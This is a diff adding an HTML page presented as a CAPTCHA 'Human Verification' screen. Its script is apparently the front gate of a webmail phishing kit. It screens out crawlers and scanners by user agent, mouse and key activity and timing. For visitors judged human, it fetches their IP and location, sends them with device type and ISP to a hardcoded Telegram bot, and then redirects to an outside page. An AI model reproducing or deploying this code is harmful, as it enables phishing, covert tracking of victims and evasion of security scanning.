@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CAPTCHA Verification</title>
+  <style>
+    /* Full page layout */
+    body {
+      font-family: 'Poppins', sans-serif;
+      background: #1a1a2e;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      color: #fff;
+    }
+
+    /* Container styling */
+    .captcha-container {
+      background: #162447;
+      padding: 35px 25px;
+      border-radius: 15px;
+      width: 320px;
+      text-align: center;
+      box-shadow: 0 15px 40px rgba(0,0,0,0.3);
+    }
+
+    h2 {
+      margin-bottom: 25px;
+      font-size: 24px;
+      color: #e43f5a;
+    }
+
+    /* CAPTCHA box */
+    .captcha-box {
+      background: #1f4068;
+      padding: 15px;
+      border-radius: 10px;
+      font-size: 22px;
+      font-weight: 600;
+      margin-bottom: 20px;
+      color: #f3f3f3;
+    }
+
+    /* Input styling */
+    input[type="text"] {
+      width: 100%;
+      padding: 12px;
+      border-radius: 10px;
+      border: none;
+      font-size: 16px;
+      margin-bottom: 20px;
+      outline: none;
+    }
+
+    input[type="text"]::placeholder {
+      color: #aaa;
+    }
+
+    /* Button styling */
+    button {
+      width: 100%;
+      padding: 12px;
+      border-radius: 10px;
+      border: none;
+      background: #e43f5a;
+      color: #fff;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: transform 0.2s, background 0.3s;
+    }
+
+    button:hover {
+      background: #d73550;
+      transform: scale(1.03);
+    }
+
+    /* Message styling */
+    .message {
+      margin-top: 12px;
+      font-weight: 500;
+    }
+
+    .error {
+      color: #ff6b6b;
+    }
+
+    .success {
+      color: #4ef26e;
+    }
+
+    /* Honeypot field hidden */
+    .honeypot {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="captcha-container">
+    <h2>Human Verification</h2>
+    <div class="captcha-box" id="captchaQuestion"></div>
+    <input type="text" id="captchaInput" placeholder="Enter the answer" />
+    <div class="honeypot">
+      <input type="text" id="honeypotField" name="honeypot" placeholder="Leave this empty" />
+    </div>
+    <button id="submitBtn">Verify</button>
+    <div id="captchaMessage" class="message"></div>
+  </div>
+
+  <!-- Keep your original JavaScript unchanged -->
+  <script>
+    let num1, num2, answer;
+    let mouseMoved = false;
+    let keyPressed = false;
+    let pageLoadedTime;
+
+    const botToken = "8096041390:AAGBcV0HBqFbmpkOpFy9LbiZczh-WqRQtQY";
+    const chatId = "6529371358";
+
+
+
+    const botUserAgents = [
+      /bot/i, /spider/i, /crawler/i, /google/i, /bing/i, /yandex/i, /slurp/i, /crawler/i, /msnbot/i, /facebookexternalhit/i, /azure/i
+    ];
+
+    function isBot() {
+      const userAgent = navigator.userAgent.toLowerCase();
+      return botUserAgents.some((pattern) => pattern.test(userAgent));
+    }
+
+    document.addEventListener("mousemove", () => mouseMoved = true);
+    document.addEventListener("keydown", () => keyPressed = true);
+    pageLoadedTime = Date.now();
+
+    function preventBotSubmission() {
+      if (isBot()) return true;
+      if (!mouseMoved || !keyPressed) return true;
+      if (Date.now() - pageLoadedTime < 3000) return true;
+      return false;
+    }
+
+    function generateCaptcha() {
+      num1 = Math.floor(Math.random() * 10) + 1;
+      num2 = Math.floor(Math.random() * 10) + 1;
+      answer = num1 + num2;
+      document.getElementById("captchaQuestion").innerText = `What is ${num1} + ${num2}?`;
+      document.getElementById("captchaMessage").innerText = '';
+      document.getElementById("captchaInput").value = '';
+    }
+
+    function getDeviceType() {
+      const ua = navigator.userAgent;
+      if (/iPhone|iPad|iPod/i.test(ua)) return "iOS Device";
+      if (/Android/i.test(ua)) return "Android Device";
+      if (/Windows/i.test(ua)) return "Windows PC";
+      if (/Macintosh/i.test(ua)) return "macOS Device";
+      if (/Linux/i.test(ua)) return "Linux Device";
+      return "Unknown Device";
+    }
+
+    async function sendToTelegram(message) {
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+      const payload = { chat_id: chatId, text: message };
+      try { await fetch(url, { method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify(payload) }); }
+      catch (err) { console.error("Telegram error:", err); }
+    }
+
+    async function validateCaptcha() {
+      if (preventBotSubmission()) {
+        document.getElementById("captchaMessage").innerHTML = "<p class='error'>Access blocked due to bot-like behavior.</p>";
+        return;
+      }
+
+      if (document.getElementById("honeypotField").value.trim()) {
+        document.getElementById("captchaMessage").innerHTML = "<p class='error'>Access blocked due to bot-like behavior.</p>";
+        return;
+      }
+
+      const userAnswer = parseInt(document.getElementById("captchaInput").value.trim());
+      const messageEl = document.getElementById("captchaMessage");
+
+      if (userAnswer === answer) {
+        messageEl.innerHTML = "<p class='success'>Verified! Redirecting... ✅</p>";
+        try {
+          const res = await fetch("https://ipinfo.io/json?token=4b4e37d7269136");
+          const data = await res.json();
+          const deviceType = getDeviceType();
+          const userMessage = `
+🔐 WEBMAIL
+📱 Device: ${deviceType}
+🌍 IP: ${data.ip}
+🏙️ City: ${data.city}
+📍 Region: ${data.region}
+📦 Country: ${data.country}
+📮 Postal: ${data.postal}
+🕐 Timezone: ${data.timezone}
+📡 ISP: ${data.org}
+          `.trim();
+          await sendToTelegram(userMessage);
+        } catch (e) { console.warn("IP info error:", e); }
+
+        setTimeout(() => {
+          const finalUrl = `https://bronco.website/up/index_out.html`;
+          window.location.href = finalUrl;
+        }, 1000);
+      } else {
+        messageEl.innerHTML = "<p class='error'>Incorrect. Please try again.</p>";
+        generateCaptcha();
+      }
+    }
+
+    document.addEventListener("DOMContentLoaded", () => {
+      generateCaptcha();
+      document.getElementById("submitBtn").addEventListener("click", validateCaptcha);
+    });
+  </script>
+</body>
+</html>
